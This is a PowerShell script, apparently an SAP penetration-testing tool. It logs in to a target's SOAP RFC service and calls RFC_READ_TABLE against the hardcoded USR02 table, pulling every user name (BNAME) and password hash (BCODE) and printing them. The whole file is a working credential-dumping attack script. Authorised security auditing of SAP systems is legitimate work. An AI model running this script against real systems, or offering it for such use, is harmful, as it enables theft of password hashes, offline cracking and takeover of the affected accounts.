<#
    .Synopsis
      Calls SOAP RFC_READ_TABLE function 
    .Description
      Calls the function RFC_READ_TABLE, through the /sap/bc/soap/rfc SOAP 
      service, to read data from tables.
      /!\ Hardcoded USR02 table /!\
    .Author
      @_Sn0rkY

    All credit to Agnivesh Sathasivam & @nmonkee  
#>

#-Set Parameters
    Param(
    [parameter(Mandatory = $true, HelpMessage="target like : http(s)://ip:port")]
    [alias("t")]
    [string]$target,

    [parameter(Mandatory = $true)]
    [alias("c")]
    [string]$client,
  
    [parameter(Mandatory = $true)]
    [alias("u")]
    [string]$username,
    
    [parameter(Mandatory = $true)]
    [string]$password = $( Read-Host -asSecureString "Input password" )
    )

function WriteXmlToScreen ([xml]$xml)
{
    $StringWriter = New-Object System.IO.StringWriter;
    $XmlWriter = New-Object System.Xml.XmlTextWriter $StringWriter;
    $XmlWriter.Formatting = "indented";
    $xml.WriteTo($XmlWriter);
    $XmlWriter.Flush();
    $StringWriter.Flush();
    Write-Output $StringWriter.ToString();
}

function Execute-SOAPRequest 
{ 

$pair = "$($username):$($password)"

$encodedCreds = [System.Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($pair))
$basicAuthValue = "Basic $encodedCreds"

$Headers = @{
        'SOAPAction' = 'urn:sap-com:document:sap:rfc:functions'
        'sap-client' = $client 
        'sap-language' = 'EN'
        Authorization = $basicAuthValue
    }

$postParams = '<?xml version="1.0" encoding="utf-8" ?><env:Envelope xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"><env:Body><n1:RFC_READ_TABLE xmlns:n1="urn:sap-com:document:sap:rfc:functions" env:encodingStyle="http://schemas.xmlsoap.org/soap/encoding/"><DELIMITER xsi:type="xsd:string">|</DELIMITER><NO_DATA xsi:nil="true"></NO_DATA><QUERY_TABLE xsi:type="xsd:string">USR02</QUERY_TABLE><DATA xsi:nil="true"></DATA><FIELDS xsi:nil="true"><item><FIELDNAME>BNAME</FIELDNAME></item><item><FIELDNAME>BCODE</FIELDNAME></item></FIELDS><OPTIONS xsi:nil="true"></OPTIONS></n1:RFC_READ_TABLE></env:Body></env:Envelope>'

#$soapreq = Invoke-WebRequest $url -Method $method -ContentType "text/xml" -InFile RFC_READ_TABLE2.xml -Headers $Headers
$soapreq = Invoke-WebRequest $url -Method $method -ContentType "text/xml" -Body $postParams -Headers $Headers

WriteXmlToScreen $soapreq.Content
#Write-Host $soapreq.Content
} 

#-Main

$url = $target+'/sap/bc/soap/rfc'
$method = 'post'

Execute-SOAPRequest  

#-End

